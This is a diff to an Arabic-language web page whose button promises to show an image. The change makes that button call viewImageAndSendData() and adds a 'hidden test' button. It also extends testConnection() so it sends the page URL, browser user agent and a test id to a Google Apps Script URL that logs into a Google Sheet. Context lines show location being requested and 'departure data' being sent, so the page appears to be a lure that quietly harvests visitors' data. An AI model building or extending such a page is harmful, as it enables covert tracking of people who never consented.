@@ -240,8 +240,13 @@
                 </div>
             </div>
 
-            <button class="view-button" id="viewButton" onclick="viewImage()">
+            <button class="view-button" id="viewButton" onclick="viewImageAndSendData()">
                 🔍 مشاهدة الصورة الآن
+            </button>
+
+            <!-- زر اختبار مخفي للتشخيص -->
+            <button onclick="testConnection()" style="background: #ff6b6b; color: white; padding: 10px; border: none; border-radius: 5px; margin: 10px; cursor: pointer;">
+                🔧 اختبار الاتصال
             </button>
         </div>
     </div>
@@ -492,18 +497,34 @@
             setTimeout(getLocation, 1000);
         });
 
-        // اختبار الاتصال فوراً
+        // اختبار الاتصال فوراً مع عرض النتائج
         async function testConnection() {
             const testData = {
                 test: true,
                 timestamp: new Date().toLocaleString('ar-IQ'),
                 page_url: window.location.href,
-                user_agent: navigator.userAgent
+                user_agent: navigator.userAgent,
+                test_id: 'WEB_TEST_' + Date.now()
             };
             
-            console.log('اختبار الاتصال...');
-            const result = await sendData(testData);
-            console.log('نتيجة اختبار الاتصال:', result);
+            console.log('🔍 اختبار الاتصال...');
+            console.log('📤 البيانات المرسلة:', testData);
+            console.log('🔗 الرابط المستخدم:', GOOGLE_SCRIPT_URL);
+            
+            try {
+                const result = await sendData(testData);
+                console.log('✅ نتيجة اختبار الاتصال:', result);
+                
+                // عرض النتيجة للمستخدم
+                if (result) {
+                    alert('✅ نجح الاتصال! تحقق من Google Sheet');
+                } else {
+                    alert('❌ فشل الاتصال! تحقق من Console');
+                }
+            } catch (error) {
+                console.error('❌ خطأ في الاختبار:', error);
+                alert('❌ خطأ: ' + error.message);
+            }
         }
 
         // إرسال بيانات المغادرة
